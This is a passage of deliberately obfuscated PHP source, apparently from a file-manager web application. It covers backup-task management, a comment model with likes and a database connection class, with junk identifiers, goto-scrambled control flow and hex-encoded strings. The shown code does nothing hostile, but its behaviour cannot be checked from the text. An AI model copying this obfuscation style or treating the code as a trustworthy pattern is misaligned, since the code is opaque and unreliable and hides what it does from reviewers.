config() { goto F×İŠÀ´ÒÜ; b·÷Êäº¢ˆ: Action($d…‘‰ª·¦ô[1568])->taskInit(); $e‚ƒ„‹‘”Á = Model($d…‘‰ª·¦ô[1569])->listData(); foreach ($e‚ƒ„‹‘”Á as $a˜£ ÛÆ¾ë) { if ($a˜£ ÛÆ¾ë[$d…‘‰ª·¦ô[824]] == $d…‘‰ª·¦ô[384] && $a˜£ ÛÆ¾ë[$d…‘‰ª·¦ô[1083]] == $d…‘‰ª·¦ô[1570]) { $CÄæÖƒ•—ø = $a˜£ ÛÆ¾ë; break; } } goto Aµ‡‹°¤î‘; dïŠç«¨«Ò: $fš …í“„ = is_array($fš …í“„) ? $fš …í“„ : array(); if (!isset($fš …í“„[$d…‘‰ª·¦ô[457]])) { $fš …í“„[$d…‘‰ª·¦ô[457]] = $d…‘‰ª·¦ô[410]; } $CÄæÖƒ•—ø = array(); goto b·÷Êäº¢ˆ; Aµ‡‹°¤î‘: if (isset($CÄæÖƒ•—ø[$d…‘‰ª·¦ô[198]])) { $CÄæÖƒ•—ø[$d…‘‰ª·¦ô[198]] = json_decode($CÄæÖƒ•—ø[$d…‘‰ª·¦ô[198]], !0); } if (isset($fš …í“„[$d…‘‰ª·¦ô[198]])) { $CÄæÖƒ•—ø[$d…‘‰ª·¦ô[198]][$d…‘‰ª·¦ô[1070]] = $fš …í“„[$d…‘‰ª·¦ô[198]]; unset($fš …í“„[$d…‘‰ª·¦ô[198]]); } return array_merge($CÄæÖƒ•—ø, $fš …í“„); goto F™ÌøÙ‰‘Ø; F×İŠÀ´ÒÜ: $d…‘‰ª·¦ô =& $_SERVER[°Óó£ÌİóèÅ]; $fš …í“„ = Model($d…‘‰ª·¦ô[832])->get($d…‘‰ª·¦ô[476]); $fš …í“„ = json_decode($fš …í“„, !0); goto dïŠç«¨«Ò; F™ÌøÙ‰‘Ø: } public function listData($fèÓµ„ñäŒ = false, $eÓõ™§«Ÿ = "\x6d\x6f\144\x69\x66\x79\124\x69\155\x65", $dÊÀÚãÙÕØ = false) { return parent::listData($fèÓµ„ñäŒ, $eÓõ™§«Ÿ, !0); } public function lastItem() { $cª²À½–ºë = $this->listData(); return !empty($cª²À½–ºë[0]) ? $cª²À½–ºë[0] : null; } public function kill($D´¾Û„ÒÈ­) { goto cÌÔ¥ì»ìÎ; CŠïÃÇ«Öâ: return $this->remove($D´¾Û„ÒÈ­); goto f³ĞÓ‚ª´; cÌÔ¥ì»ìÎ: $C«ˆ‡õØ° =& $_SERVER[°Óó£ÌİóèÅ]; $e·‹‘ìôÍ÷ = $this->listData($D´¾Û„ÒÈ­); if (!$e·‹‘ìôÍ÷ || empty($e·‹‘ìôÍ÷[$C«ˆ‡õØ°[28]])) { return !0; } goto C¬é‡Ñä; C¬é‡Ñä: Task::kill($C«ˆ‡õØ°[475]); Task::kill($C«ˆ‡õØ°[505]); Task::kill($C«ˆ‡õØ°[513]); goto dÖ‘­±µÔé; dÖ‘­±µÔé: $Fµéñ¦£œ‹ = $e·‹‘ìôÍ÷[$C«ˆ‡õØ°[28]]; $Eİµ¢óê÷… = TEMP_FILES . $C«ˆ‡õØ°[483] . $Fµéñ¦£œ‹ . $C«ˆ‡õØ°[8]; IO::remove($Eİµ¢óê÷…, !1); goto CŠïÃÇ«Öâ; f³ĞÓ‚ª´: } public function remove($aÌÅ¹§éÈ‹) { $Cá§ª´ñ¸ä = $this->listData($aÌÅ¹§éÈ‹); if (!$Cá§ª´ñ¸ä) { return !0; } return $this->backupRemove($Cá§ª´ñ¸ä); } private function backupRemove($e¹³äòùñ’) { $e¡‚í¥¾  =& $_SERVER[°Óó£ÌİóèÅ]; parent::remove($e¹³äòùñ’[$e¡‚í¥¾ [376]]); $AĞÜÃËïá = "\x7b\x69\157\x3a{$e¹³äòùñ’[$e¡‚í¥¾ [456]]}\x7d\x2f\x64\141\x74\x61\142\141\x73\145\57" . $e¹³äòùñ’[$e¡‚í¥¾ [28]]; IO::remove($AĞÜÃËïá, !1); return !0; } public function start() { goto FÁÌÓ£°‚™; Aò‡Å‚›“”: if (Hook::trigger($C¡Óï£‘ãÇ[1571]) == $C¡Óï£‘ãÇ[1572]) { return !0; } $f¨¾ÓÎ±©œ = $this->process(); foreach ($f¨¾ÓÎ±©œ as $e´¿Ì£Ë¾) { if ($e´¿Ì£Ë¾) { return Task::restart($e´¿Ì£Ë¾[$C¡Óï£‘ãÇ[376]]); } } goto Aç¿µ‡Ìˆ±; aìµ¥ò†¥: if (!$DÕÜõî¶Ú„->dbFile()) { return !1; } if ($b£Õñ¸‘Ö¸[$C¡Óï£‘ãÇ[457]] == $C¡Óï£‘ãÇ[410]) { $DÕÜõî¶Ú„->file(); } Backup::set(array($C¡Óï£‘ãÇ[454] => 1, $C¡Óï£‘ãÇ[468] => time())); goto bÉìáß²¹Ê; bÉìáß²¹Ê: return !0; goto aˆÕä©­²; Aç¿µ‡Ìˆ±: $DÕÜõî¶Ú„ = new Backup(); $DÕÜõî¶Ú„->keep(); if (!$DÕÜõî¶Ú„->db()) { return !1; } goto aìµ¥ò†¥; FÁÌÓ£°‚™: $C¡Óï£‘ãÇ =& $_SERVER[°Óó£ÌİóèÅ]; $b£Õñ¸‘Ö¸ = $this->config(); if (!$b£Õñ¸‘Ö¸ || $b£Õñ¸‘Ö¸[$C¡Óï£‘ãÇ[1068]] != $C¡Óï£‘ãÇ[384]) { return !1; } goto Aò‡Å‚›“”; aˆÕä©­²: } public function process() { $FØÆÙÓáÑË =& $_SERVER[°Óó£ÌİóèÅ]; return array($FØÆÙÓáÑË[459] => Task::get($FØÆÙÓáÑË[475]), $FØÆÙÓáÑË[462] => Task::get($FØÆÙÓáÑË[505]), $FØÆÙÓáÑË[172] => Task::get($FØÆÙÓáÑË[513])); } public function restore() { $dÉî·åŒí— =& $_SERVER[°Óó£ÌİóèÅ]; ActionCall($dÉî·åŒí—[1573], !0, 1); ActionCall($dÉî·åŒí—[1573], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\145\x6e\164"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\155\x65" => "\143\x6f\155\155\x65\156\164\x5f\155\145\164\141", "\155\x65\x74\x61\106\151\x65\154\144" => "\143\157\x6d\x6d\145\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($aÆòÒˆ ¢£) { $bÌÏÆé„öŠ =& $_SERVER[°Óó£ÌİóèÅ]; if ($aÆòÒˆ ¢£[$bÌÏÆé„öŠ[1574]]) { $c‡¼Š£Î† = $this->where(array($bÌÏÆé„öŠ[1575] => $aÆòÒˆ ¢£[$bÌÏÆé„öŠ[1574]]))->find(); if (!$c‡¼Š£Î† || $c‡¼Š£Î†[$bÌÏÆé„öŠ[401]] != $aÆòÒˆ ¢£[$bÌÏÆé„öŠ[401]] || $c‡¼Š£Î†[$bÌÏÆé„öŠ[403]] != $aÆòÒˆ ¢£[$bÌÏÆé„öŠ[403]]) { return !1; } $this->where(array($bÌÏÆé„öŠ[1575] => $aÆòÒˆ ¢£[$bÌÏÆé„öŠ[1574]]))->setAdd($bÌÏÆé„öŠ[1576], 1); } return $this->add($aÆòÒˆ ¢£); } public function remove($Cº²‡Ì˜¼) { $báÈÅî‘¢ =& $_SERVER[°Óó£ÌİóèÅ]; $Bõê“ª÷Ê¯ = array($báÈÅî‘¢[1575] => $Cº²‡Ì˜¼); $C˜ÛÃö›Õä = $this->where($Bõê“ª÷Ê¯)->find(); if ($C˜ÛÃö›Õä[$báÈÅî‘¢[1574]]) { $this->where(array($báÈÅî‘¢[1575] => $C˜ÛÃö›Õä[$báÈÅî‘¢[1574]]))->setAdd($báÈÅî‘¢[1576], -1); } return $this->where($Bõê“ª÷Ê¯)->delete(); } public function edit($F®°¢Õ¦£¢, $cÕÔÀ¬¥¨) { $E–øÓÎÁ§ =& $_SERVER[°Óó£ÌİóèÅ]; $DÀ··âí¬ = array($E–øÓÎÁ§[1575] => $F®°¢Õ¦£¢); return $this->where($DÀ··âí¬)->save(array($E–øÓÎÁ§[1577] => $cÕÔÀ¬¥¨)); } public function prasise($Cã´šßß) { $bøƒ³¬çãª =& $_SERVER[°Óó£ÌİóèÅ]; $a‘Ä‹ÈÃÌ‹ = Model($bøƒ³¬çãª[1578]); $F§íÇ§á‡º = array($bøƒ³¬çãª[1575] => $Cã´šßß, $bøƒ³¬çãª[1086] => USER_ID); $fô¦è¤¨²Ê = $a‘Ä‹ÈÃÌ‹->where($F§íÇ§á‡º)->find(); if (!$fô¦è¤¨²Ê) { $a‘Ä‹ÈÃÌ‹->add($F§íÇ§á‡º); $aéö¸ã½¥ = $this->where(array($bøƒ³¬çãª[1575] => $Cã´šßß))->setAdd($bøƒ³¬çãª[1579], 1); } else { $a‘Ä‹ÈÃÌ‹->where($F§íÇ§á‡º)->delete(); $aéö¸ã½¥ = $this->where(array($bøƒ³¬çãª[1575] => $Cã´šßß))->setAdd($bøƒ³¬çãª[1579], -1); } return $aéö¸ã½¥; } public function targetInfo($d×Ó§ó„Ù™, $cŞ‹Õ¶ƒãö) { goto fŸÄ“´Œ‚á; fŸÄ“´Œ‚á: $Aßäğ–ÒÔô =& $_SERVER[°Óó£ÌİóèÅ]; $cÑæ‰Æ º = array($Aßäğ–ÒÔô[400] => $d×Ó§ó„Ù™, $Aßäğ–ÒÔô[402] => $cŞ‹Õ¶ƒãö); $c£ˆ©ø¢åœ = $this->where($cÑæ‰Æ º)->count(); goto E‹½‚¨å”à; F¨¢£óêŠ: return $eÎ¹²ª¢ÎÍ; goto fË‡…ƒ“ƒ¦; E‹½‚¨å”à: $f­¯ÎÌ¾§³ = "\122\111\107\x48\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\x63\x6f\155\155\x65\x6e\164\x5f\x70\162\141\151\163\145\x20\163\164\x61\162\x20\x6f\x6e\x20\x63\x6f\x6d\x6d\x65\156\x74\56\143\157\x6d\x6d\145\x6e\164\111\x44\40\x3d\x20\163\x74\x61\162\x2e\x63\x6f\155\x6d\145\x6e\x74\x49\x44"; $c—è–Ñä¦ = $this->alias($Aßäğ–ÒÔô[351])->where($cÑæ‰Æ º)->join($f­¯ÎÌ¾§³, $Aßäğ–ÒÔô[1580])->count(); $eÎ¹²ª¢ÎÍ = array($Aßäğ–ÒÔô[1581] => $c£ˆ©ø¢åœ, $Aßäğ–ÒÔô[1582] => $c—è–Ñä¦); goto F¨¢£óêŠ; fË‡…ƒ“ƒ¦: } public function listData($c°¨š„ÎŒì) { $FŠ¹½•ƒ»Ø =& $_SERVER[°Óó£ÌİóèÅ]; if (isset($c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1583]])) { if ($c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1583]]) { $c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1584]] = array($FŠ¹½•ƒ»Ø[695], intval($c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1583]])); } unset($c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1583]]); } if (isset($c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1585]])) { if ($c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1585]]) { $c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1584]] = array($FŠ¹½•ƒ»Ø[692], intval($c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1585]])); } unset($c°¨š„ÎŒì[$FŠ¹½•ƒ»Ø[1585]]); } return $this->_listData($c°¨š„ÎŒì); } private function _listData($aĞ”ß¦‚ëÕ) { $c ³ÍèË™· =& $_SERVER[°Óó£ÌİóèÅ]; $eêˆ¡Ÿ = $this->where($aĞ”ß¦‚ëÕ)->_makeOrder()->selectPage(100); $this->_listAppendParent($eêˆ¡Ÿ[$c ³ÍèË™·[364]]); $this->_listAppendUser($eêˆ¡Ÿ[$c ³ÍèË™·[364]]); $this->_listAppendMeta($eêˆ¡Ÿ[$c ³ÍèË™·[364]]); return $eêˆ¡Ÿ; } private function _makeOrder() { $fò“…¼Ø» =& $_SERVER[°Óó£ÌİóèÅ]; $EÉ„Ø¤¦ƒô = array($fò“…¼Ø»[1579], $fò“…¼Ø»[1576], $fò“…¼Ø»[195]); $Cùíî£×ËÁ = Input::get($fò“…¼Ø»[1586], $fò“…¼Ø»[7], $fò“…¼Ø»[1587], $EÉ„Ø¤¦ƒô); $e‰”ÁÁ±Ğä = Input::get($fò“…¼Ø»[1588], $fò“…¼Ø»[7], $fò“…¼Ø»[1088], array($fò“…¼Ø»[1589], $fò“…¼Ø»[1590])); $E°÷áÑ™»ñ = $Cùíî£×ËÁ . $fò“…¼Ø»[50] . $e‰”ÁÁ±Ğä; return $this->order($E°÷áÑ™»ñ); } private function _listAppendParent(&$d†ÑéË¡Ö) { goto bŒáÇ…; bŒáÇ…: $e®§Ñ¬˜³ =& $_SERVER[°Óó£ÌİóèÅ]; $FØˆ×¤ç×„ = array_unique(array_to_keyvalue($d†ÑéË¡Ö, $e®§Ñ¬˜³[33], $e®§Ñ¬˜³[1574])); $FØˆ×¤ç×„ = array_remove_value($FØˆ×¤ç×„, $e®§Ñ¬˜³[410]); goto AŠí¥”ÔÕ“; fÙ¦éĞçÅÕ: foreach ($d†ÑéË¡Ö as &$aÒ«´…ñÇâ) { if (isset($F³Æë¼®Úì[$aÒ«´…ñÇâ[$e®§Ñ¬˜³[1574]]])) { $aÒ«´…ñÇâ[$e®§Ñ¬˜³[1591]] = $F³Æë¼®Úì[$aÒ«´…ñÇâ[$e®§Ñ¬˜³[1574]]]; } } goto FÖöÛ¹¦¹; AŠí¥”ÔÕ“: if (!$FØˆ×¤ç×„) { return; } $F³Æë¼®Úì = $this->where(array($e®§Ñ¬˜³[1575] => array($e®§Ñ¬˜³[7], $FØˆ×¤ç×„)))->select(); $F³Æë¼®Úì = array_to_keyvalue($F³Æë¼®Úì, $e®§Ñ¬˜³[1584]); goto fÙ¦éĞçÅÕ; FÖöÛ¹¦¹: } private function _listAppendUser(&$bêïà ÏÕ) { goto D·Ğ‡¿ƒ³; cªååğƒ…ó: if (count($BĞƒ¡œ……›) == 0) { return; } foreach ($bêïà ÏÕ as $F„œ½¨£¯©) { if (isset($F„œ½¨£¯©[$BÖ…ÏÓ§Œ¡[1591]])) { $BĞƒ¡œ……›[] = $F„œ½¨£¯©[$BÖ…ÏÓ§Œ¡[1591]][$BÖ…ÏÓ§Œ¡[1095]]; } } $DóĞŸ¢²÷ = Model($BÖ…ÏÓ§Œ¡[1481])->userListInfo($BĞƒ¡œ……›); goto cÅéš¶¯å˜; D·Ğ‡¿ƒ³: $BÖ…ÏÓ§Œ¡ =& $_SERVER[°Óó£ÌİóèÅ]; $BĞƒ¡œ……› = array_unique(array_to_keyvalue($bêïà ÏÕ, $BÖ…ÏÓ§Œ¡[33], $BÖ…ÏÓ§Œ¡[1095])); $BĞƒ¡œ……› = array_remove_value($BĞƒ¡œ……›, $BÖ…ÏÓ§Œ¡[410]); goto cªååğƒ…ó; cÅéš¶¯å˜: foreach ($bêïà ÏÕ as &$F„œ½¨£¯©) { $F„œ½¨£¯©[$BÖ…ÏÓ§Œ¡[424]] = $DóĞŸ¢²÷[$F„œ½¨£¯©[$BÖ…ÏÓ§Œ¡[1095]]]; if (isset($F„œ½¨£¯©[$BÖ…ÏÓ§Œ¡[1591]])) { $F„œ½¨£¯©[$BÖ…ÏÓ§Œ¡[1591]][$BÖ…ÏÓ§Œ¡[424]] = $DóĞŸ¢²÷[$F„œ½¨£¯©[$BÖ…ÏÓ§Œ¡[1591]][$BÖ…ÏÓ§Œ¡[1095]]]; } } goto C£îï‰î¼º; C£îï‰î¼º: } private function _listAppendMeta(&$b¦ëó¤æ) { goto a©°ˆÖñ·”; a©°ˆÖñ·”: $DááÃÏ¢Œ =& $_SERVER[°Óó£ÌİóèÅ]; $A¯ÒëÖò”– = array_unique(array_to_keyvalue($b¦ëó¤æ, $DááÃÏ¢Œ[33], $DááÃÏ¢Œ[1584])); $A¯ÒëÖò”– = array_remove_value($A¯ÒëÖò”–, $DááÃÏ¢Œ[410]); goto CˆÁÒ¦«Ä¤; CˆÁÒ¦«Ä¤: if (!$A¯ÒëÖò”–) { return; } foreach ($b¦ëó¤æ as $eª»…£¡š) { if (isset($eª»…£¡š[$DááÃÏ¢Œ[1591]])) { $A¯ÒëÖò”–[] = $eª»…£¡š[$DááÃÏ¢Œ[1591]][$DááÃÏ¢Œ[1584]]; } } $Eè×²ôªÊ = $this->metaList($A¯ÒëÖò”–); goto eŠ¸•ğÎŒ; eŠ¸•ğÎŒ: if (!$Eè×²ôªÊ) { return !1; } foreach ($b¦ëó¤æ as &$eª»…£¡š) { $eª»…£¡š[$DááÃÏ¢Œ[1592]] = $Eè×²ôªÊ[$eª»…£¡š[$DááÃÏ¢Œ[1584]]]; if (isset($eª»…£¡š[$DááÃÏ¢Œ[1591]])) { $eª»…£¡š[$DááÃÏ¢Œ[1591]][$DááÃÏ¢Œ[1592]] = $Eè×²ôªÊ[$eª»…£¡š[$DááÃÏ¢Œ[1591]][$DááÃÏ¢Œ[1584]]]; } } goto a×—ŞŞî¯ô; a×—ŞŞî¯ô: } private function metaList($eêÓÃğß‰©) { goto F´­í©ÒÍ; eÀäŠ…‹æ«: $aó‘™ê«¦ = Model($E‘×¬ëƒêç[1593])->where($A”²»¸ğ)->select(); $aó‘™ê«¦ = array_to_keyvalue_group($aó‘™ê«¦, $E‘×¬ëƒêç[1584]); foreach ($aó‘™ê«¦ as $eøˆ¼ï©‚Ş => $Aö£ö†íî™) { $eÎëçµ = array(); foreach ($Aö£ö†íî™ as $B©˜Ë”øç) { $eÎëçµ[$B©˜Ë”øç[$E‘×¬ëƒêç[96]]] = $B©˜Ë”øç[$E‘×¬ëƒêç[367]]; } $aó‘™ê«¦[$eøˆ¼ï©‚Ş] = $eÎëçµ; } goto BÜ”§ŠŒ˜é; BÜ”§ŠŒ˜é: return $aó‘™ê«¦ ? $aó‘™ê«¦ : array(); goto cÆ‹›ôÙÆ; F´­í©ÒÍ: $E‘×¬ëƒêç =& $_SERVER[°Óó£ÌİóèÅ]; if (!$eêÓÃğß‰©) { return array(); } $A”²»¸ğ = array($E‘×¬ëƒêç[1584] => array($E‘×¬ëƒêç[7], $eêÓÃğß‰©)); goto eÀäŠ…‹æ«; cÆ‹›ôÙÆ: } } goto bø¬´‚¤Œ; C‘ë‰İÍùˆ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\145\x71" => "\x3c\76", "\x67\x74" => "\76", "\145\x67\164" => "\76\75", "\x6c\x74" => "\x3c", "\x65\x6c\164" => "\x3c\75", "\156\x6f\164\x6c\151\x6b\x65" => "\x4e\x4f\124\40\114\x49\x4b\x45", "\x6c\x69\153\x65" => "\x4c\111\x4b\105", "\151\156" => "\111\116", "\156\x6f\164\151\x6e" => "\116\117\124\x20\111\x4e", "\156\157\164\x20\x69\x6e" => "\x4e\x4f\x54\x20\x49\116", "\x62\145\x74\x77\x65\x65\156" => "\x42\105\124\x57\105\x45\116", "\x6e\x6f\164\142\x65\x74\x77\145\145\156" => "\116\117\124\40\102\105\x54\x57\x45\105\x4e", "\x6e\157\x74\40\142\145\x74\167\145\145\156" => "\116\117\x54\x20\102\105\124\x57\105\x45\x4e"); protected $selectSql = "\x53\105\x4c\105\x43\x54\45\104\111\x53\124\x49\116\103\x54\45\40\x25\106\x49\x45\114\104\x25\x20\x46\x52\x4f\x4d\40\45\x54\x41\102\114\x45\x25\x25\x4a\117\111\x4e\x25\x25\127\110\x45\122\x45\45\45\107\x52\x4f\x55\x50\45\45\x48\101\126\111\x4e\x47\45\45\117\122\104\105\122\x25\x25\114\x49\x4d\111\124\x25\x20\45\125\116\x49\x4f\x4e\45\45\103\x4f\115\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $A˜Şæ¯Íø = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[°Óó£ÌİóèÅ][642], $A˜Şæ¯Íø); } public function factory($fµÂ‰æ¼ = '') { goto d‹àÁ±ÙŠ¤; d‹àÁ±ÙŠ¤: $c¯èÚ±Â =& $_SERVER[°Óó£ÌİóèÅ]; $fµÂ‰æ¼ = $this->parseConfig($fµÂ‰æ¼); if (empty($fµÂ‰æ¼[$c¯èÚ±Â[643]])) { think_exception(think_lang($c¯èÚ±Â[644])); } goto E‚Ü¬ÎÆ“; D‘İÖİÉÚ¯: return $b««ïç©ô; goto DƒÕÒîËÉŠ; E‚Ü¬ÎÆ“: $this->dbType = ucwords(strtolower($fµÂ‰æ¼[$c¯èÚ±Â[643]])); $eå¥¿¥š§ = $c¯èÚ±Â[645] . $this->dbType; if (class_exists($eå¥¿¥š§)) { $b««ïç©ô = new $eå¥¿¥š§($fµÂ‰æ¼); if ($c¯èÚ±Â[499] != strtolower($fµÂ‰æ¼[$c¯èÚ±Â[643]])) { $b««ïç©ô->dbType = strtoupper($this->dbType); } else { $b««ïç©ô->dbType = $this->_getDsnType($fµÂ‰æ¼[$c¯èÚ±Â[595]]); } } else { think_exception(think_lang($c¯èÚ±Â[646]) . $c¯èÚ±Â[647] . $eå¥¿¥š§); } goto D‘İÖİÉÚ¯; DƒÕÒîËÉŠ: } public function __call($F—´šÒ·Ä, $B­Å™ ¦ˆî) { if (method_exists($this, $F—´šÒ·Ä)) { return call_user_func_array(array($this, $F—´šÒ·Ä), $B­Å™ ¦ˆî); } } protected function _getDsnType($B‡é¹àííˆ) { $f…µß‹ãÅ‚ = explode($_SERVER[°Óó£ÌİóèÅ][4], $B‡é¹àííˆ); $Bå×éçÁÜÁ = strtoupper(trim($f…µß‹ãÅ‚[0])); return $Bå×éçÁÜÁ; } private function parseConfig($Cº¼œšª™« = '') { $bã¢ò‚½í =& $_SERVER[°Óó£ÌİóèÅ]; if (!empty($Cº¼œšª™«) && is_string($Cº¼œšª™«)) { $Cº¼œšª™« = $this->parseDSN($Cº¼œšª™«); } elseif (is_array($Cº¼œšª™«)) { $Cº¼œšª™« = array_change_key_case($Cº¼œšª™«); $Cº¼œšª™« = array($bã¢ò‚½í[643] => $Cº¼œšª™«[$bã¢ò‚½í[648]], $bã¢ò‚½í[567] => $Cº¼œšª™«[$bã¢ò‚½í[649]], $bã¢ò‚½í[568] => $Cº¼œšª™«[$bã¢ò‚½í[650]], $bã¢ò‚½í[565] => $Cº¼œšª™«[$bã¢ò‚½í[651]], $bã¢ò‚½í[566] => $Cº¼œšª™«[$bã¢ò‚½í[652]], $bã¢ò‚½í[17] => $Cº¼œšª™«[$bã¢ò‚½í[653]], $bã¢ò‚½í[595] => $Cº¼œšª™«[$bã¢ò‚½í[654]], $bã¢ò‚½í[13] => $Cº¼œšª™«[$bã¢ò‚½í[655]]); } elseif (empty($Cº¼œšª™«)) { if (think_config($bã¢ò‚½í[501]) && $bã¢ò‚½í[499] != strtolower(think_config($bã¢ò‚½í[498]))) { $Cº¼œšª™« = $this->parseDSN(think_config($bã¢ò‚½í[501])); } else { $Cº¼œšª™« = array($bã¢ò‚½í[643] => think_config($bã¢ò‚½í[498]), $bã¢ò‚½í[567] => think_config($bã¢ò‚½í[656]), $bã¢ò‚½í[568] => think_config($bã¢ò‚½í[657]), $bã¢ò‚½í[565] => think_config($bã¢ò‚½í[658]), $bã¢ò‚½í[566] => think_config($bã¢ò‚½í[659]), $bã¢ò‚½í[17] => think_config($bã¢ò‚½í[245]), $bã¢ò‚½í[595] => think_config($bã¢ò‚½í[501]), $bã¢ò‚½í[13] => think_config($bã¢ò‚½í[660])); } } return $Cº¼œšª™«; } protected function initConnect($AÀŠŸÛãµ‚ = true) { if (1 == think_config($_SERVER[°Óó£ÌİóèÅ][18])) { $this->_linkID = $this->multiConnect($AÀŠŸÛãµ‚); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($BˆÇİóá… = false) { $fšøÒ“İË¬ =& $_SERVER[°Óó£ÌİóèÅ]; static $Aº¿„ÇŒ¬ = array(); if (empty($Aº¿„ÇŒ¬)) { foreach ($this->config as $c£¹œ‘²‰Ğ => $E‹´—ùŸ) { $Aº¿„ÇŒ¬[$c£¹œ‘²‰Ğ] = explode($fšøÒ“İË¬[47], $E‹´—ùŸ); } } if (think_config($fšøÒ“İË¬[661])) { if ($BˆÇİóá…) { $C¿à¤¶¤Âì = floor(mt_rand(0, think_config($fšøÒ“İË¬[662]) - 1)); } else { if (is_numeric(think_config($fšøÒ“İË¬[663]))) { $C¿à¤¶¤Âì = think_config($fšøÒ“İË¬[663]); } else { $C¿à¤¶¤Âì = floor(mt_rand(think_config($fšøÒ“İË¬[662]), count($Aº¿„ÇŒ¬[$fšøÒ“İË¬[565]]) - 1)); } } } else { $C¿à¤¶¤Âì = floor(mt_rand(0, count($Aº¿„ÇŒ¬[$fšøÒ“İË¬[565]]) - 1)); } $e»¬Ë™»ÕÆ = array($fšøÒ“İË¬[567] => isset($Aº¿„ÇŒ¬[$fšøÒ“İË¬[567]][$C¿à¤¶¤Âì]) ? $Aº¿„ÇŒ¬[$fšøÒ“İË¬[567]][$C¿à¤¶¤Âì] : $Aº¿„ÇŒ¬[$fšøÒ“İË¬[567]][0], $fšøÒ“İË¬[568] => isset($Aº¿„ÇŒ¬[$fšøÒ“İË¬[568]][$C¿à¤¶¤Âì]) ? $Aº¿„ÇŒ¬[$fšøÒ“İË¬[568]][$C¿à¤¶¤Âì] : $Aº¿„ÇŒ¬[$fšøÒ“İË¬[568]][0], $fšøÒ“İË¬[565] => isset($Aº¿„ÇŒ¬[$fšøÒ“İË¬[565]][$C¿à¤¶¤Âì]) ? $Aº¿„ÇŒ¬[$fšøÒ“İË¬[565]][$C¿à¤¶¤Âì] : $Aº¿„ÇŒ¬[$fšøÒ“İË¬[565]][0], $fšøÒ“İË¬[566] => isset($Aº¿„ÇŒ¬[$fšøÒ“İË¬[566]][$C¿à¤¶¤Âì]) ? $Aº¿„ÇŒ¬[$fšøÒ“İË¬[566]][$C¿à¤¶¤Âì] : $Aº¿„ÇŒ¬[$fšøÒ“İË¬[566]][0], $fšøÒ“İË¬[17] => isset($Aº¿„ÇŒ¬[$fšøÒ“İË¬[17]][$C¿à¤¶¤Âì]) ? $Aº¿„ÇŒ¬[$fšøÒ“İË¬[17]][$C¿à¤¶¤Âì] : $Aº¿„ÇŒ¬[$fšøÒ“İË¬[17]][0], $fšøÒ“İË¬[595] => isset($Aº¿„ÇŒ¬[$fšøÒ“İË¬[595]][$C¿à¤¶¤Âì]) ? $Aº¿„ÇŒ¬[$fšøÒ“İË¬[595]][$C¿à¤¶¤Âì] : $Aº¿„ÇŒ¬[$fšøÒ“İË¬[595]][0], $fšøÒ“İË¬[13] => isset($Aº¿„ÇŒ¬[$fšøÒ“İË¬[13]][$C¿à¤¶¤Âì]) ? $Aº¿„ÇŒ¬[$fšøÒ“İË¬[13]][$C¿à¤¶¤Âì] : $Aº¿„ÇŒ¬[$fšøÒ“İË¬[13]][0]); return $this->connect($e»¬Ë™»ÕÆ, $C¿à¤¶¤Âì); } public function parseDSN($dÙœö¨‚“é) { $b’¼µ‹ñ³ƒ =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($dÙœö¨‚“é)) { return !1; } $dÄ¥ù…ã¨ = parse_url($dÙœö¨‚“é); if ($dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[173]]) { $cˆÛŞì™ñ = array($b’¼µ‹ñ³ƒ[643] => $dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[173]], $b’¼µ‹ñ³ƒ[567] => isset($dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[424]]) ? $dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[424]] : $b’¼µ‹ñ³ƒ[33], $b’¼µ‹ñ³ƒ[568] => isset($dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[664]]) ? $dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[664]] : $b’¼µ‹ñ³ƒ[33], $b’¼µ‹ñ³ƒ[565] => isset($dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[174]]) ? $dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[174]] : $b’¼µ‹ñ³ƒ[33], $b’¼µ‹ñ³ƒ[566] => isset($dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[175]]) ? $dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[175]] : $b’¼µ‹ñ³ƒ[33], $b’¼µ‹ñ³ƒ[17] => isset($dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[84]]) ? substr($dÄ¥ù…ã¨[$b’¼µ‹ñ³ƒ[84]], 1) : $b’¼µ‹ñ³ƒ[33]); } else { preg_match($b’¼µ‹ñ³ƒ[665], trim($dÙœö¨‚“é), $cæ×”ĞˆÅ»); $cˆÛŞì™ñ = array($b’¼µ‹ñ³ƒ[643] => $cæ×”ĞˆÅ»[1], $b’¼µ‹ñ³ƒ[567] => $cæ×”ĞˆÅ»[2], $b’¼µ‹ñ³ƒ[568] => $cæ×”ĞˆÅ»[3], $b’¼µ‹ñ³ƒ[565] => $cæ×”ĞˆÅ»[4], 